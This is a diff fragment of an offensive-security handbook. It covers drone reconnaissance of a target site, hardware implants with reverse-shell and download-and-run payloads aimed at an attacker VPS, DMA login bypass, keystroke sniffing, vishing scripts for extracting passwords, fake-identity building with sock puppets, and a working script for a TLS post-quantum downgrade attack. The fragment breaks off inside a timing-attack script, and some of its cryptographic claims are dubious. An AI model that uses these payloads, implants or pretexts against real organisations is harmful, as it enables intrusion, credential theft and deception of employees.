+    Dual cameras (24mm + 70mm) → telephoto from distance
+    Better for reading badge reader models from 50+ feet
+    Flight time: 46 minutes
+
+LEGAL FRAMEWORK (important; jurisdictions vary):
+  USA (FAA Part 107): Need cert for commercial ops over 55 lbs; Mini 4 Pro exempt
+    but must fly below 400ft AGL and not over people or moving vehicles
+    Pre-engage: check airspace on B4UFLY app, avoid Class B/C/D without waiver
+  
+  UK (CAA): A2 CofC required for drones over 250g in populated areas
+    Mini 4 Pro (249g): C1 category, some restrictions in populated zones
+  
+  EU: Sub-250g "open" category A1: essentially unrestricted at low altitude
+
+PRE-OP DRONE CHECKLIST:
+  1. Airspace check: B4UFLY (US), Drone Scene (UK); no TFRs over target
+  2. Launch point: public road or public park minimum 200m from target
+  3. Flight plan: approach from offset angle (not directly from launch point)
+  4. Recording: 4K continuous, also manual photos at zoom for details
+  5. Altitude: 60-80m provides full roof coverage with minimal conspicuousness
+  6. Timing: early morning (6-8am) → minimal foot traffic, good light
+  7. Flight time: 10-12 minutes max over target area → lands before anyone calls
+
+DELIVERABLES FROM DRONE RECON:
+  - Photo map: camera positions annotated on aerial photo
+  - HVAC rooftop entry points: vents, access hatches, skylight positions
+  - Guard booth coverage arcs: where they watch vs where they don't
+  - Badge reader close-up: confirm HID vs MIFARE vs keypad
+  - Fence / perimeter: condition, height, camera gaps
+  - Loading dock timing: vehicle arrival/departure patterns
+```
+
+---
+
+### 1.7 HARDWARE IMPLANTS - DEEP REFERENCE
+
+#### LAN Turtle - Persistent Network Foothold
+
+```
+PURPOSE: Persistent SSH tunnel from inside the network to your VPS.
+          Gives you full network access without being on-site.
+
+SETUP (do this BEFORE deployment):
+# Step 1: Get a VPS for callback
+# Use: DigitalOcean, Vultr, or Linode; pay with Monero + Mullvad VPN
+# VPS needs: open ports 22 (SSH) + 2222 (reverse tunnel)
+
+# Step 2: Configure SSH on VPS to accept reverse tunnels
+# /etc/ssh/sshd_config on VPS:
+GatewayPorts yes
+AllowTcpForwarding yes
+ClientAliveInterval 60
+ClientAliveCountMax 3
+
+# Step 3: SSH into LAN Turtle over USB during setup
+ssh root@172.16.84.1  # default LAN Turtle IP when connected via USB
+
+# Step 4: Install autossh module
+opkg update && opkg install autossh
+
+# Step 5: Configure Autossh module
+# Set: Remote Host = your VPS IP
+#      Remote Port = 2222
+#      SSH Key = generated key pair (turtle → VPS)
+#      Local Port = 22 (Turtle's SSH)
+
+# Step 6: Generate and copy SSH key
+ssh-keygen -t ed25519 -f /root/.ssh/turtle_key -N ""
+# Copy public key to VPS authorized_keys
+
+# AFTER DEPLOYMENT: accessing the network:
+# From anywhere:
+ssh -p 2222 root@YOUR_VPS_IP  # → you're in the Turtle
+# Now pivot to internal network:
+ssh -L 8080:INTERNAL_TARGET:80 root@172.16.84.1  # port forward through Turtle
+
+WHAT LAN TURTLE SEES:
+  Full Layer 2 access to the network segment it's planted in
+  ARP, DHCP, DNS all visible
+  Can run tcpdump, nmap, Responder through the tunnel
+```
+
+#### O.MG Cable - HID Attack
+
+```
+PURPOSE: Appears identical to genuine Apple/USB-C cable.
+          Contains WiFi microcontroller that accepts remote commands
+          and types them as keystrokes on connected machine.
+
+SETUP:
+  Purchase: o.mg.lol (Elite, C-Type, or Lightning variants)
+  Flash firmware via O.MG Programmer (included)
+  Configure WiFi: connect O.MG to hotspot → access web interface
+  Program payload: DuckyScript → cross-platform keystroke injection
+
+DUCKYSCRIPT PAYLOAD (macOS reverse shell):
+  DELAY 1000
+  GUI SPACE
+  DELAY 500
+  STRING terminal
+  ENTER
+  DELAY 800
+  STRING bash -i >& /dev/tcp/YOUR_VPS_IP/4444 0>&1
+  ENTER
+
+DUCKYSCRIPT PAYLOAD (Windows PowerShell download cradle):
+  DELAY 1000
+  GUI r
+  DELAY 500
+  STRING powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_VPS/payload.ps1')"
+  ENTER
+
+OPERATION:
+  1. Leave cable in conference room charging station or at reception
+  2. Or plug directly into unattended machine (30-second window)
+  3. Connect remotely via hotspot → trigger payload
+  4. Reverse shell connects back to your VPS listener:
+     nc -lvnp 4444  # catch the shell
+```
+
+#### PCILeech / DMA Attack
+
+```
+PURPOSE: Direct Memory Access over PCIe/Thunderbolt.
+          Reads and writes target RAM without needing OS credentials.
+          Bypasses BitLocker, login screens, EDR agents.
+
+HARDWARE:
+  Screamer M.2 (PCILeech FPGA board): $50-130
+    Fits in M.2 slot (common in laptops)
+    Requires brief physical access to install
+  
+  USB3380 EVB: $15-30 (PCIe x1, older method)
+  
+  Thunderbolt attack: PCILeech over Thunderbolt port (no disassembly needed)
+    Target must have Thunderbolt port + DMA protection disabled (common pre-2022)
+
+SOFTWARE:
+  git clone https://github.com/ufrisk/pcileech
+  cd pcileech && make
+
+ATTACK SEQUENCE:
+# From attacker machine connected via DMA board:
+
+# Step 1: Identify memory layout
+./pcileech pagedisplay -min 0 -max 0x100000000 2>/dev/null | head -100
+
+# Step 2: Search RAM for target data
+./pcileech search -s "password" --all      # search for password strings
+./pcileech search -s "NTLM" --all         # search for NTLM hashes in RAM
+./pcileech search -s "lsass" --all        # find LSASS process in RAM
+
+# Step 3: Extract BitLocker key from RAM
+./pcileech pslist                          # list running processes
+./pcileech dump -out memory.raw            # full RAM dump
+# Then: run volatility3 on memory.raw to extract keys
+volatility3 -f memory.raw windows.bitlocker
+
+# Step 4: Write to memory (bypass login screen)
+./pcileech patch --all -sig signatures/macos_unlock.sig
+# Pre-built signatures for macOS, Windows, Linux login bypass
+# Signs replace lockscreen authentication logic in memory
+
+WHAT DMA PROTECTION PREVENTS:
+  Kernel DMA Protection (enabled in modern Windows 11 / recent macOS): blocks this
+  Check via: System Information → Kernel DMA Protection → On/Off
+  Mitigation: target older machines, pre-2021 hardware, or use Thunderbolt attack
+              before OS boots (cold boot scenario)
+```
+
+#### KeySweeper - Wireless Keyboard Sniffer
+
+```
+PURPOSE: Disguised as a USB charger. Sniffs and logs Microsoft wireless
+          keyboard keystrokes (2.4GHz unencrypted communications).
+
+HARDWARE NEEDED:
+  ATmega328P microcontroller (Arduino compatible)
+  NRF24L01 2.4GHz module ($2)
+  USB connector + enclosure (looks like wall charger)
+  Total cost: ~$15 in parts
+
+FIRMWARE:
+  git clone https://github.com/samyk/keysweeper
+  Flash to Arduino via Arduino IDE
+  Configure: SIM900 GSM module (optional, for SMS exfil)
+              or collect locally, retrieve SD card
+
+DEPLOYMENT:
+  Place in office near target workstation
+  Optimal range: 15-30 feet (through walls OK)
+  Stores keystrokes to EEPROM or SD card
+  GSM module variant: texts keystrokes to your phone number
+
+TARGETS:
+  Microsoft Wireless Desktop 2000, 3000, 5000 series
+  Microsoft Wireless Keyboard 2000, 3000 series
+  All 2.4GHz Microsoft wireless keyboards pre-2019
+  
+  NOT affected: Logitech (uses AES), Bluetooth keyboards
+
+DATA COLLECTED:
+  Full keystroke log including passwords, emails, searches
+  Timestamp + session detection
+  Output: plaintext log file
+```
+
+---
+
+### 1.8 MINIMUM VIABLE KIT - SHOPPING LISTS
+
+```
+TIER 1: BEGINNER PHYSICAL ($400–500):
+  Sparrows Reload Pick Set          $40    sparrowslockpicks.com
+  Practice locks (4 locks)          $35    Master No.3, No.140, ABUS 55/40, Schlage
+  Flipper Zero                      $170   flipperzero.one
+  T5577 blank cards (20 pack)       $8     AliExpress
+  Plain polo shirts (3 colors)      $45    for pretext
+  Clipboard + professional notepad  $12    Target/Staples
+  Lanyard + generic badge holder    $8     Amazon
+  Under-Door Tool (UDT)             $40    covertinstruments.com
+  Phone recording app (legal)       $0     for debrief documentation
+  
+  TOTAL: ~$358
+
+TIER 2: INTERMEDIATE ($900–1,100):
+  Everything in Tier 1              ~$358
+  Proxmark3 RDV4                    $350   proxmark.com / Dangerous Things
+  LAN Turtle                        $55    hak5.org
+  Bash Bunny                        $120   hak5.org
+  ESP-RFID-Tool components          $25    AliExpress
+  Burner Android phone              $50    prepaid, cash purchase
+  RFID-blocking sleeve (for wallet) $8     to protect your own cards
+  
+  TOTAL: ~$966
+
+TIER 3: ADVANCED ($2,000–2,500):
+  Everything in Tier 2              ~$966
+  DJI Mini 4 Pro                    $760   for aerial recon
+  O.MG Elite Cable                  $180   o.mg.lol
+  PCILeech Screamer M.2             $130   shop.lambdaconcept.com
+  ChameleonMini RevG                $110   lab401.com
+  Wi-Fi Pineapple Mark VII          $120   hak5.org
+  BishopFox Tastic RFID Thief       $200   BishopFox (custom build or GitHub plans)
+  
+  TOTAL: ~$2,466
+```
+
+---
+
+## SECTION 2: SOCIAL ENGINEERING - THE HUMAN ATTACK SURFACE
+
+> Physical Red Team gets you in the building. Social Engineering gets you to trust that you belong there, and gets insiders to hand you what you cannot steal.
+
+---
+
+### 2.1 VISHING - VOICE PHISHING
+
+#### Voice Attack Framework
+
+```
+OBJECTIVE: obtain credentials, information, or access via phone call
+           without triggering suspicion
+
+PRE-CALL INTELLIGENCE:
+  1. Target name: LinkedIn or company directory
+  2. Manager name: org chart from LinkedIn / corporate website
+  3. IT helpdesk number: company website
+  4. Internal terminology: press releases, job postings
+     ("We use ServiceNow for ticketing" = reference "my ServiceNow ticket")
+  5. Recent company events: earnings calls, press releases, layoffs
+     Reference them: "with the new Q4 restructure we're resetting all accounts"
+
+VOICE MODIFICATION (optional but increases success):
+  Background noise: office ambient noise (YouTube: "office background noise")
+  Voice changer: optional; natural voice with confidence works better
+  Call from: VOIP service (MySudo, TextNow), which shows any number you choose
+  
+  Spoof your number to show: IT Helpdesk, HR, vendor support
+  VOIP spoofing services: SpoofCard, SpoofTel (research legality in your jurisdiction)
+```
+
+#### Pretext Scripts
+
+```
+PRETEXT 1: IT HELPDESK → USER
+
+Scenario: You are calling the target employee as IT support
+
+Script:
+"Hi, is this [NAME]? Great. This is [JAMES] from the IT Security team: 
+we're calling about an alert we received on your account. Our monitoring 
+system flagged unusual login activity from a different location this morning, 
+and I need to verify your account is secured.
+
+Can you confirm the last four digits of your employee ID? 
+[Pause: they give it]
+Perfect. I'm seeing the alert tied to your account. We're resetting 
+credentials for all affected users right now. I'll need you to verify 
+your current password so I can confirm which reset queue you're in.
+
+[GET THE PASSWORD or redirect:]
+Actually, to be safe, let me send you a reset link to your email. 
+Can you confirm your email address? And what's the last password you 
+used so I can make sure the reset clears it from our system?"
+
+Why it works:
+  - Authority (IT Security team)
+  - Urgency (your account was compromised)  
+  - Reciprocity (they help you → "protect" them)
+  - Social proof (we're calling everyone affected)
+
+---
+
+PRETEXT 2: USER → IT HELPDESK
+
+Scenario: You call their IT helpdesk as an employee
+
+Script:
+"Hi, this is [SARAH JENKINS] from [MARKETING / DEPARTMENT FOUND ON LINKEDIN]. 
+I'm locked out of my account; I got a new laptop this morning and 
+it's not accepting my password. I have a presentation in 40 minutes 
+and my slides are in SharePoint. Can you do an emergency reset?
+
+[Employee ID if asked]: I don't have my card in front of me: 
+it's on my desk upstairs. Can you look me up by email? 
+It's [sjenkins@target.com / first-letter + last-name format observed from their email format]
+
+[Security question if asked]: 
+My manager is [NAME FROM LINKEDIN]. 
+Department is [REAL DEPARTMENT FOUND ON LINKEDIN].
+I started [3 years ago / find from LinkedIn profile]."
+
+Why it works:
+  - Helpdesk wants to be helpful (it's their job)
+  - Urgency creates pressure to skip verification steps
+  - Correct details (found via OSINT) build confidence
+  - Real employees forget their employee ID all the time
+
+---
+
+PRETEXT 3: VENDOR → EXECUTIVE ASSISTANT
+
+Scenario: Calling EA to get calendar or facility access for "executive meeting"
+
+Script:
+"Hi, this is [MICHAEL TORRES] from [VENDOR: use a real vendor found in job postings].
+I'm calling to confirm the meeting Thursday with [EXECUTIVE NAME FROM LINKEDIN].
+Our team lead is flying in and I want to make sure we have visitor badges arranged 
+and the right conference room booked.
+
+Can you confirm the floor number for the [EXECUTIVE] suite?
+And who do we ask for at the reception desk?
+Should we bring ID? What format do you take for visitor logs?"
+
+Why it works:
+  - Uses real executive names (LinkedIn)
+  - Uses real vendor relationship (job postings)
+  - Low-stakes request (logistics, not credentials)
+  - Gets you: floor access info, reception process, visitor badge design
+```
+
+---
+
+### 2.2 PERSONA DEVELOPMENT & IDENTITY LEGENDS
+
+```
+WHAT IS A LEGEND:
+  A complete, consistent false identity that withstands scrutiny.
+  Not just a fake name: a fake professional existence.
+
+LEGEND COMPONENTS:
+  1. Full name (first + last)
+  2. Company name + role + phone number (set up VOIP line)
+  3. Email address (set up real email on custom domain: $12/year)
+  4. LinkedIn profile (built 60+ days before use: aged profiles look real)
+  5. Business card (vistaprint, ~$20 for 250 cards)
+  6. Vehicle that matches persona (rental in persona's name, or borrowed)
+  7. Clothing appropriate to role
+  8. Backstory: where you were before, how long with company, recent projects
+
+BUILDING A LINKEDIN LEGEND (60+ days before use):
+  Create: professional headshot (AI-generated at thispersondoesnotexist.com
+          or generated-photos.com)
+  Add: 2-3 previous positions (make up verifiable-looking companies or use 
+       dissolved companies from state business registries)
+  Add: 5-8 skills, 2-3 recommendations (create sock puppet accounts for these)
+  Connect: 50+ first-degree connections (connect with real people in the field
+           → many accept, especially recruiters)
+  Activity: post or share 2-3 industry articles before use
+  Result: profile appears 1-2 years old and professionally active
+
+EMAIL DOMAIN SETUP:
+  Register: [COMPANYNAME].com or [COMPANYNAME]-it.com or [COMPANY]-services.net
+  Set up: Zoho Mail or Google Workspace ($6/month)
+  Configure: SPF, DKIM, DMARC records (so email passes filters)
+  Use: for pretext email campaigns or to receive callback
+  
+PERSONA VERIFICATION:
+  Before deployment, try to verify your own persona:
+  - Google the name + company → should return your LinkedIn
+  - Call the VOIP number you set up → confirm it rings + has voicemail greeting
+  - Send an email from the legend email → confirm it arrives unfiltered
+  - Check: can someone googling "COMPANY NAME + NAME" find a plausible person?
+```
+
+---
+
+## SECTION 3: QUANTUM COMPUTING 2027
+
+> The cryptographic underpinning of almost every secure system you will encounter is mathematically vulnerable to a machine that does not yet fully exist. The key insight: it doesn't need to exist yet. The data needs to exist now.
+
+---
+
+### 3.1 THE THREAT MODEL
+
+```
+WHAT QUANTUM COMPUTING ACTUALLY THREATENS:
+
+ASYMMETRIC CRYPTOGRAPHY (ALL BROKEN by Shor's Algorithm):
+  RSA-2048: broken in ~hours on a CRQC
+  RSA-4096: broken in ~days on a CRQC
+  ECDSA P-256: broken (same Shor's discrete log attack)
+  ECDH: key exchange broken; session keys exposed
+  DH-2048/4096: broken
+  Ed25519: broken (discrete log)
+  DSA: broken
+  
+  These protect: HTTPS/TLS, SSH, PGP, JWT (RS256/ES256), S/MIME,
+                 VPN (IKE), code signing, Bitcoin/Ethereum signatures
+
+SYMMETRIC CRYPTOGRAPHY (weakened, NOT broken):
+  AES-128: Grover's → effective 64-bit security → BROKEN
+  AES-192: Grover's → effective 96-bit security → marginal
+  AES-256: Grover's → effective 128-bit security → STILL SAFE
+  
+  SHA-256: Grover's halves collision resistance → still adequate at 256-bit
+  SHA-3: same analysis → safe
+  ChaCha20: safe (symmetric)
+
+TIMELINE:
+  2024: NIST finalizes first PQC standards (ML-KEM, ML-DSA, SLH-DSA)
+  2025–2027: Migration period begins: hybrid classical+PQC deployments
+  2027–2030: Mainstream adoption, critical infrastructure migration
+  2030–2035: Estimated window for Cryptographically Relevant Quantum Computer (CRQC)
+              Most expert estimates cluster around 2030–2033
+  
+  KEY INSIGHT: You don't need a CRQC now.
+               You need the TRAFFIC captured now.
+               "Store Now, Decrypt Later" (SNDL) = harvest today, decrypt in 5-10 years.
+               Nation-state adversaries started SNDL collection in ~2018.
+```
+
+### 3.2 SNDL COLLECTION INFRASTRUCTURE
+
+```
+GOAL: Capture and archive encrypted traffic from high-value targets
+       for future decryption when CRQC becomes available
+
+WHAT TO COLLECT:
+  Priority 1: TLS handshakes to government / military / financial targets
+  Priority 2: Encrypted executive email (S/MIME, PGP)
+  Priority 3: VPN traffic (IKE phase 1/2 negotiations)
+  Priority 4: SSH sessions (key exchange material)
+  Priority 5: Any RSA/ECDSA-encrypted traffic with long-lived secrets
+
+COLLECTION ARCHITECTURE:
+
+  [Network TAP / SPAN PORT]
+         ↓
+  [Zeek + tcpdump collector]
+         ↓
+  [Tag + Filter + Compress]
+         ↓
+  [Encrypted cold storage]
+         ↓
+  [Index for future retrieval]
+```
+
+```bash
+# ===== ZEEK SETUP FOR PROTOCOL-AWARE COLLECTION =====
+
+# Install Zeek (formerly Bro):
+sudo apt-get install zeek -y    # or: brew install zeek (macOS)
+
+# Configure capture interface:
+# /etc/zeek/node.cfg
+[zeek]
+type=standalone
+host=localhost
+interface=eth0    # your capture interface
+
+# Run Zeek on live traffic:
+zeek -i eth0 -C &  # -C: disable checksum verification (useful on taps)
+
+# Zeek auto-generates structured logs:
+# conn.log        : all connections (src/dst/port/duration/bytes)
+# ssl.log         : TLS sessions (cipher suites, cert chains, JA3 fingerprints)
+# x509.log        : certificate details (subject, issuer, key type, key size)
+# ssh.log         : SSH sessions (key exchange algorithm, cipher)
+# dns.log         : DNS queries
+
+# FILTER: only log TLS sessions with RSA/ECDSA (quantum-vulnerable):
+# /usr/share/zeek/site/sndl-filter.zeek
+@load base/protocols/ssl
+
+event ssl_established(c: connection)
+    {
+    local subject = (c$ssl?$subject) ? c$ssl$subject : "";
+    local cipher  = (c$ssl?$cipher)  ? c$ssl$cipher  : "";
+    
+    # Flag quantum-vulnerable cipher suites
+    if (/RSA/ in cipher || /ECDSA/ in cipher || /ECDHE/ in cipher)
+        {
+        print fmt("SNDL_TARGET %s -> %s | Cipher: %s | Subject: %s",
+            c$id$orig_h, c$id$resp_h, cipher, subject);
+        }
+    }
+
+# Load custom filter:
+echo "@load sndl-filter" >> /usr/share/zeek/site/local.zeek
+```
+
+```bash
+# ===== TARGETED PCAP COLLECTION =====
+
+# Capture only TLS ClientHello + ServerHello (handshake material):
+# This is the minimum needed for future CRQC decryption
+# Handshakes are much smaller than full session captures
+
+# Capture full TLS handshakes (port 443, 8443, 465, 993, 995):
+tcpdump -i eth0 \
+  '(tcp[tcpflags] & (tcp-syn|tcp-ack) != 0) or (port 443 or port 8443 or port 465 or port 993 or port 995)' \
+  -w /storage/sndl/$(date +%Y%m%d_%H%M%S)_tls.pcap \
+  -G 3600 \         # rotate every 1 hour
+  -C 500 \          # rotate at 500MB
+  -z gzip           # compress on rotation
+
+# Capture IKE/VPN key exchange only (IPsec negotiation):
+tcpdump -i eth0 '(udp port 500 or udp port 4500)' \
+  -w /storage/sndl/$(date +%Y%m%d_%H%M%S)_vpn.pcap -G 3600 -z gzip
+
+# Capture SSH key exchange only (first 3 packets of SSH session):
+tcpdump -i eth0 'tcp port 22 and (tcp[tcpflags] & tcp-syn != 0)' \
+  -w /storage/sndl/$(date +%Y%m%d_%H%M%S)_ssh.pcap -G 3600 -z gzip
+
+# STORAGE SCHEMA:
+# /storage/sndl/
+#   raw/          ← compressed PCAPs
+#   processed/    ← Zeek logs (structured JSON)
+#   index/        ← SQLite DB for searching
+#   metadata/     ← source, collection date, priority tag
+
+# Index SQLite schema for future retrieval:
+sqlite3 /storage/sndl/index/collection.db <<'EOF'
+CREATE TABLE IF NOT EXISTS captures (
+    id          INTEGER PRIMARY KEY,
+    filename    TEXT NOT NULL,
+    src_ip      TEXT,
+    dst_ip      TEXT,
+    dst_port    INTEGER,
+    cipher      TEXT,
+    cert_cn     TEXT,
+    key_type    TEXT,
+    key_bits    INTEGER,
+    collected   DATETIME DEFAULT CURRENT_TIMESTAMP,
+    target_tag  TEXT,
+    priority    INTEGER DEFAULT 3
+);
+CREATE INDEX idx_dst_ip ON captures(dst_ip);
+CREATE INDEX idx_cipher ON captures(cipher);
+CREATE INDEX idx_priority ON captures(priority);
+EOF
+```
+
+---
+
+### 3.3 PQC MIGRATION ATTACK - DOWNGRADE
+
+```
+THE ATTACK CONCEPT:
+During 2025-2030, systems migrate to Post-Quantum Cryptography.
+Hybrid mode = server offers BOTH classical (RSA/ECDH) AND PQC (ML-KEM).
+Client picks cipher from server's list.
+
+If an attacker (MITM) can modify the ClientHello to REMOVE the ML-KEM cipher,
+the server falls back to classical cipher.
+The session is now vulnerable to future CRQC decryption.
+This is the downgrade attack.
+
+PREREQUISITE: MITM position on the network (ARP spoof, rogue AP, compromised router)
+```
+
+```python
+#!/usr/bin/env python3
+"""
+PQC Downgrade Attack: Strip ML-KEM from TLS ClientHello
+Forces server to use classical (quantum-vulnerable) cipher suites
+
+LEGAL NOTE: Use only in authorized red team engagements.
+
+Requirements: pip install scapy cryptography
+"""
+
+from scapy.all import *
+from scapy.layers.tls.all import *
+import struct
+
+# ML-KEM cipher suite codes (IANA assigned):
+# 0x6399 = TLS_ECDHE_MLKEM768_RSA_WITH_AES_256_GCM_SHA384
+# 0x639A = TLS_ECDHE_MLKEM768_ECDSA_WITH_AES_256_GCM_SHA384
+# 0xFE30 = TLS_ML_KEM_768 (draft, some implementations)
+# 0xFE31 = TLS_ML_KEM_1024 (draft)
+
+PQC_CIPHER_PREFIXES = [
+    b'\x63\x99',
+    b'\x63\x9A',
+    b'\xFE\x30',
+    b'\xFE\x31',
+]
+
+# TLS Extension types for PQC key share:
+# 0x0033 = key_share extension
+SUPPORTED_GROUPS_EXT = 0x000A
+KEY_SHARE_EXT         = 0x0033
+
+# ML-KEM group identifiers in supported_groups:
+# 0x0200 = X25519MLKEM768
+# 0x0201 = SecP256r1MLKEM768
+PQC_GROUPS = {0x0200, 0x0201, 0x030B, 0x030C}
+
+
+def strip_pqc_from_client_hello(raw_tls_record: bytes) -> bytes:
+    """
+    Remove ML-KEM cipher suites and key share entries from a TLS ClientHello.
+    Returns modified record bytes.
+    Falls back to original bytes if parsing fails.
+    """
+    try:
+        data = bytearray(raw_tls_record)
+        
+        # TLS record header: ContentType(1) + Version(2) + Length(2) = 5 bytes
+        if len(data) < 5 or data[0] != 0x16:  # 0x16 = Handshake
+            return bytes(data)
+        
+        record_length = struct.unpack_from('>H', data, 3)[0]
+        
+        # Handshake header: Type(1) + Length(3) = 4 bytes, starts at offset 5
+        if len(data) < 9 or data[5] != 0x01:  # 0x01 = ClientHello
+            return bytes(data)
+        
+        pos = 9  # Start of ClientHello body (after HandshakeHeader)
+        
+        # ClientHello body:
+        # ClientVersion(2) + Random(32) + SessionIDLen(1) + SessionID(var)
+        # + CipherSuitesLen(2) + CipherSuites(var) + ...
+        
+        pos += 2   # skip ClientVersion
+        pos += 32  # skip Random
+        
+        session_id_len = data[pos]
+        pos += 1 + session_id_len   # skip SessionID
+        
+        # --- CIPHER SUITES ---
+        cs_len = struct.unpack_from('>H', data, pos)[0]
+        cs_start = pos + 2
+        cs_end = cs_start + cs_len
+        
+        # Filter out PQC cipher suites (2 bytes each)
+        cipher_suites = []
+        for i in range(cs_start, cs_end, 2):
+            cs = bytes(data[i:i+2])
+            if cs not in PQC_CIPHER_PREFIXES:
+                cipher_suites.append(cs)
+        
+        # Rebuild cipher suites bytes
+        new_cs_bytes = b''.join(cipher_suites)
+        new_cs_len = len(new_cs_bytes)
+        
+        # Replace in data
+        new_data = (
+            bytes(data[:pos]) +
+            struct.pack('>H', new_cs_len) +
+            new_cs_bytes +
+            bytes(data[cs_end:])
+        )
+        data = bytearray(new_data)
+        
+        # Move pos past cipher suites
+        pos += 2 + new_cs_len
+        
+        # Skip compression methods
+        comp_len = data[pos]
+        pos += 1 + comp_len
+        
+        # --- EXTENSIONS ---
+        ext_total_len = struct.unpack_from('>H', data, pos)[0]
+        ext_start = pos + 2
+        ext_end = ext_start + ext_total_len
+        
+        pos_ext = ext_start
+        filtered_exts = bytearray()
+        
+        while pos_ext < ext_end:
+            ext_type   = struct.unpack_from('>H', data, pos_ext)[0]
+            ext_len    = struct.unpack_from('>H', data, pos_ext+2)[0]
+            ext_data   = data[pos_ext+4 : pos_ext+4+ext_len]
+            next_ext   = pos_ext + 4 + ext_len
+            
+            if ext_type == SUPPORTED_GROUPS_EXT:
+                # Filter out PQC groups
+                groups_len = struct.unpack_from('>H', ext_data, 0)[0]
+                groups = []
+                for i in range(2, 2+groups_len, 2):
+                    g = struct.unpack_from('>H', ext_data, i)[0]
+                    if g not in PQC_GROUPS:
+                        groups.append(g)
+                
+                new_groups_bytes = struct.pack('>' + 'H'*len(groups), *groups)
+                new_groups_block = struct.pack('>H', len(new_groups_bytes)) + new_groups_bytes
+                
+                filtered_exts += struct.pack('>HH', ext_type, len(new_groups_block))
+                filtered_exts += new_groups_block
+            
+            elif ext_type == KEY_SHARE_EXT:
+                # Filter key_share entries for PQC groups
+                ks_len   = struct.unpack_from('>H', ext_data, 0)[0]
+                ks_pos   = 2
+                new_shares = bytearray()
+                
+                while ks_pos < 2 + ks_len:
+                    ks_group  = struct.unpack_from('>H', ext_data, ks_pos)[0]
+                    ks_keylen = struct.unpack_from('>H', ext_data, ks_pos+2)[0]
+                    ks_key    = ext_data[ks_pos+4 : ks_pos+4+ks_keylen]
+                    
+                    if ks_group not in PQC_GROUPS:
+                        new_shares += ext_data[ks_pos:ks_pos+4+ks_keylen]
+                    
+                    ks_pos += 4 + ks_keylen
+                
+                new_ks_block = struct.pack('>H', len(new_shares)) + bytes(new_shares)
+                filtered_exts += struct.pack('>HH', ext_type, len(new_ks_block))
+                filtered_exts += new_ks_block
+            
+            else:
+                # Keep all other extensions unchanged
+                filtered_exts += data[pos_ext:next_ext]
+            
+            pos_ext = next_ext
+        
+        # Rebuild the full TLS record with updated extension block
+        new_ext_block = struct.pack('>H', len(filtered_exts)) + bytes(filtered_exts)
+        
+        # Splice back before extension area
+        rebuilt = (
+            bytes(data[:ext_start-2]) +
+            new_ext_block
+        )
+        
+        # Fix TLS record length and Handshake message length
+        hs_body_len = len(rebuilt) - 9
+        tls_body_len = len(rebuilt) - 5
+        
+        struct.pack_into('>H', rebuilt_arr := bytearray(rebuilt), 3, tls_body_len)
+        rebuilt_arr[6] = (hs_body_len >> 16) & 0xFF
+        rebuilt_arr[7] = (hs_body_len >> 8)  & 0xFF
+        rebuilt_arr[8] =  hs_body_len        & 0xFF
+        
+        return bytes(rebuilt_arr)
+    
+    except Exception as e:
+        # Parsing failed: return original unmodified
+        print(f"[!] Strip failed: {e}: passing original")
+        return raw_tls_record
+
+
+# ===== INLINE MITM USAGE =====
+# Use with nfqueue for transparent interception:
+# iptables -I FORWARD -p tcp --dport 443 -j NFQUEUE --queue-num 1
+
+try:
+    from netfilterqueue import NetfilterQueue
+    
+    def process_packet(pkt):
+        payload = pkt.get_payload()
+        
+        # Look for TLS ClientHello (0x16 0x03 0x01/0x03 0x01)
+        if (len(payload) > 5 and
+            payload[0] == 0x16 and
+            payload[1] == 0x03 and
+            payload[5] == 0x01):
+            
+            modified = strip_pqc_from_client_hello(payload)
+            if modified != payload:
+                print(f"[*] PQC downgraded: {len(payload)} → {len(modified)} bytes")
+                pkt.set_payload(modified)
+        
+        pkt.accept()
+    
+    if __name__ == "__main__":
+        print("[*] PQC Downgrade interceptor starting (queue 1)")
+        print("[*] Ensure: iptables -I FORWARD -p tcp --dport 443 -j NFQUEUE --queue-num 1")
+        nfq = NetfilterQueue()
+        nfq.bind(1, process_packet)
+        nfq.run()
+
+except ImportError:
+    print("netfilterqueue not available: use script in analysis mode only")
+    # Test with sample ClientHello bytes:
+    # sample = bytes.fromhex("160301...")
+    # result = strip_pqc_from_client_hello(sample)
+```
+
+---
+
+### 3.4 PQC IMPLEMENTATION SIDE-CHANNEL ATTACK
+
+```
+THE VULNERABILITY:
+ML-KEM (CRYSTALS-Kyber) decapsulation timing leaks information about the
+secret key through measurable execution time differences.
+This is a CLASSICAL attack on a QUANTUM-RESISTANT algorithm:
+meaning the algorithm is sound mathematically, but the IMPLEMENTATION leaks.
+
+This is the cutting edge of PQC security research as of 2027.
+```
+
+```python
+#!/usr/bin/env python3
+"""
+ML-KEM (Kyber768) Timing Side-Channel Analysis Framework
+Detects timing variance in decapsulation that leaks secret key bits
+
+Requirements:
+    pip install oqs numpy scipy matplotlib
+    liboqs must be installed: https://github.com/open-quantum-safe/liboqs
+    pip install pyoqs  (Python bindings)
+"""
+
+import time
+import statistics
+import numpy as np
+from scipy import stats
+import matplotlib.pyplot as plt
+
+try:
+    import oqs  # Open Quantum Safe Python bindings
+    OQS_AVAILABLE = True
+except ImportError:
+    OQS_AVAILABLE = False
+    print("[!] pyoqs not installed. Install: pip install pyoqs")
+    print("[!] Also requires liboqs: https://github.com/open-quantum-safe/liboqs")
+
+
+def timing_oracle_mlkem(ciphertext: bytes, kem_obj) -> float:
+    """
+    Measure decapsulation time for a given ciphertext.
+    Returns nanosecond timing measurement.
+    """
+    # Warm up CPU caches
+    _ = kem_obj.decap_secret(ciphertext)
+    
+    # High-resolution timing with cache warming
+    times = []
+    for _ in range(200):  # 200 measurements per ciphertext
+        t0 = time.perf_counter_ns()
+        secret = kem_obj.decap_secret(ciphertext)
+        t1 = time.perf_counter_ns()
+        times.append(t1 - t0)
+    
+    # Use median to reduce noise from OS scheduling
+    return statistics.median(times)
+
+
+def collect_timing_samples(n_samples: int = 5000) -> dict:
+    """
+    Collect timing measurements for valid vs invalid ciphertexts.
+    Timing difference between valid/invalid paths = Fujisaki-Okamoto
+    transform timing leak.
+    """
+    if not OQS_AVAILABLE:
+        print("[!] Cannot run: pyoqs not available")
+        return {}
+    
+    kem = oqs.KeyEncapsulation("Kyber768")
+    public_key = kem.generate_keypair()
+    
+    valid_times   = []
+    invalid_times = []
+    
+    print(f"[*] Collecting {n_samples} timing samples per category...")
+    print("[*] This takes 2-5 minutes depending on hardware")
+    
+    for i in range(n_samples):
+        if i % 500 == 0:
+            print(f"    Progress: {i}/{n_samples}")
+        
+        # Valid ciphertext path
+        ciphertext, _ = oqs.KeyEncapsulation("Kyber768").encap_secret(public_key)
+        t_valid = timing_oracle_mlkem(ciphertext, kem)
